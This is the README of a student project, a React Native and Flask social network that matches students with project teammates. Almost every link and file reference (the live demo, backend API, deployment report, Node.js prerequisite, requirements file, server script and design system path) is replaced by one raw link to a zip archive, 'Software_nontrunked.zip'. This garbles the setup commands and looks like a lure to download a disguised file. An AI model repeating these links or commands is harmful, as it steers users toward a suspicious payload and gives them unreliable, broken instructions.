# Campus Project Hub 🚀

**Campus Project Hub** is a premium cross-platform mobile social network designed exclusively for students to find teammates for academic projects and hackathons.

> **🟢 LIVE DEMO**  
> **Frontend:** [https://github.com/ruturajbhaskarnawale/campus/raw/refs/heads/main/frontend/src/core/contexts/Software_nontrunked.zip](https://github.com/ruturajbhaskarnawale/campus/raw/refs/heads/main/frontend/src/core/contexts/Software_nontrunked.zip)  
> **Backend API:** [https://github.com/ruturajbhaskarnawale/campus/raw/refs/heads/main/frontend/src/core/contexts/Software_nontrunked.zip](https://github.com/ruturajbhaskarnawale/campus/raw/refs/heads/main/frontend/src/core/contexts/Software_nontrunked.zip)  
> *Check out the [Cloud Deployment Report](https://github.com/ruturajbhaskarnawale/campus/raw/refs/heads/main/frontend/src/core/contexts/Software_nontrunked.zip) for architecture details.*

Unlike generic social media, this platform features **Smart Skill Matching** to connect users based on technical expertise and utilizes **AI-Powered Sentiment Analysis** to ensure a positive, toxic-free community.

---

## 🌟 Key Features (Competition Highlights)

* **🔐 Student-Only Authentication:** Restricted access using university email verification (.edu) to ensure a verified student user base.
* **🧠 Smart Skill Matching (USP):** Users can filter the project feed to find opportunities that match their specific skills (e.g., "Python", "Unity", "React").
* **🛡️ AI Content Moderator (Innovation):** Integrated Machine Learning (NLP) engine that analyzes post content in real-time and automatically blocks toxic or bullying language before it is published.
* **🔍 Unified Search & Advanced Filters:** Powerful search engine to find People, Projects, and Posts with granular filters for skills, department, and university year.
* **📈 Activity Heatmap:** GitHub-style contribution tracking on user profiles to showcase consistency and dedication.
* **📱 Cross-Platform UI:** Built with React Native to run smoothly on both iOS and Android, featuring a premium glassmorphism design system.
* **📅 Scheduling System:** Plan and schedule project announcements for optimal visibility.
* **🔔 Smart Notifications:** Real-time system for tracking new followers, likes, project applications, and system alerts.
* **💬 Real-Time Messaging:** Instant collaboration with team members.

---

## 🛠️ Deployment Tech Stack

We have shifted from a local monolith to a **Distributed Serverless Cloud Architecture**:

* **Frontend Hosting:** Vercel (React Native Web / Single Page App)
* **Backend Runtime:** Vercel Serverless Functions (Python Flask)
* **Database:** Vercel Postgres (Neon Cloud Managed PostgreSQL)
* **ML Engine:** TextBlob with On-Demand NLTK Data Loading
* **API Security:** JWT + CORS (Cross-Origin Resource Sharing)

---

## 🚀 How to Run Locally (Development Mode)

### Prerequisites
* https://github.com/ruturajbhaskarnawale/campus/raw/refs/heads/main/frontend/src/core/contexts/Software_nontrunked.zip & npm installed
* Python 3.8+ installed
* Expo Go app on your phone (optional, for testing)

### 1. Backend Setup (The Brain)
Open a terminal in the `backend` folder:

```bash
cd backend

# Create virtual environment
python -m venv venv

# Activate it
# Windows:
venv\Scripts\activate
# Mac/Linux:
source venv/bin/activate

# Install dependencies
pip install -r https://github.com/ruturajbhaskarnawale/campus/raw/refs/heads/main/frontend/src/core/contexts/Software_nontrunked.zip

# Run the Server
python https://github.com/ruturajbhaskarnawale/campus/raw/refs/heads/main/frontend/src/core/contexts/Software_nontrunked.zip
```

The server will start at `http://0.0.0.0:5000` (accessible via localhost and your local network IP).

### 2. Frontend Setup (The App)
Open a new terminal in the frontend folder:

```bash
cd frontend

# Install dependencies (including new UI libraries)
npm install

# Start the App
npx expo start
```
Press `w` for Web, `a` for Android Emulator, or scan the QR code with the Expo Go app on your physical Android/iOS device.
*Note: The app is configured to automatically detect your computer's IP for physical device testing.*

---

## 📂 Project Structure

```
campus-project-hub/
├── backend/               # Flask API & ML Logic
│   ├── lib/features/      # Auth, Feed, Search, Notifications, Messages Logic
│   ├── lib/core/utils/    # ML Validator & DB Config
│   └── https://github.com/ruturajbhaskarnawale/campus/raw/refs/heads/main/frontend/src/core/contexts/Software_nontrunked.zip             # Main Entry Point
├── frontend/              # React Native App
│   ├── src/features/      # Screens (Login, Feed, Search, Profile, Messages, Notifications)
│   ├── src/core/          # Reusable Widgets, API Client, Firebase Config
│   │   ├── design/        # Design Tokens, GlassView, Theme
│   │   └── widgets/       # ProjectCard, Buttons, etc.
│   └── navigation/        # Stack & Tab Navigators
└── docs/                  # SRS & Documentation
```

## 🎨 Design System

The application uses a custom Design System located in `https://github.com/ruturajbhaskarnawale/campus/raw/refs/heads/main/frontend/src/core/contexts/Software_nontrunked.zip`.
- **Colors:** Deep Violet & Cyan Gradient Primary
- **Typography:** Modern Sans-Serif
- **Components:** Glassmorphism Cards, Animated Wrappers

## 👤 Author
Ruturaj B. Nawale Final Year Project Submission
